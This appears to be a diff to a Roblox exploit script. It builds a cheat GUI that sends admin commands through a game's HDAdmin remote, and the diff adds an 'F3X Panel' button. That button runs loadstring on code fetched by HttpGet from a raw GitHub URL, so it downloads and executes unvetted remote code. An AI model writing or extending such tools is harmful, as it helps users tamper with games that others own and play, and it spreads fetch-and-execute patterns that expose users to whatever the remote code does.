@@ -1,3 +1,4 @@
+-- Script
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local localPlayer = Players.LocalPlayer
@@ -18,8 +19,8 @@ sGui.ResetOnSpawn = false
 sGui.Parent = cg
 
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 300, 0, 180) -- Smaller size
-frame.Position = UDim2.new(0.5, -150, 0.5, -90) -- Adjusted position
+frame.Size = UDim2.new(0, 300, 0, 200) -- Increased height slightly to accommodate F3X button
+frame.Position = UDim2.new(0.5, -150, 0.5, -100) -- Adjusted position
 frame.BackgroundColor3 = Color3.fromRGB(40, 45, 50)
 frame.BorderSizePixel = 0
 frame.Active = true
@@ -203,9 +204,12 @@ local function createBtn(text, posX, posY, color)
     return btn
 end
 
+-- Adjusted button positions to fit within frame
 local fireOnceBtn = createBtn("Fire", 0.025, 145, Color3.fromRGB(60, 120, 220))
 local loopBtn = createBtn("Loop", 0.35, 145, Color3.fromRGB(50, 150, 50))
 local musicBtn = createBtn("Music", 0.675, 145, Color3.fromRGB(140, 100, 200))
+-- Adjusted F3X button position to fit within frame
+local f3xBtn = createBtn("F3X Panel", 0.35, 175, Color3.fromRGB(200, 100, 50))
 
 local looping = false
 
@@ -267,6 +271,11 @@ musicBtn.MouseButton1Click:Connect(function()
     local randomId = musicIds[math.random(1, #musicIds)]
     local fullCmd = getPrefix() .. "music " .. randomId
     ReplicatedStorage:WaitForChild("HDAdminClient"):WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(fullCmd)
+end)
+
+-- F3X Panel button functionality
+f3xBtn.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/F3X-Panel/main/Main.lua"))()
 end)
 
 -- Compact selection buttons
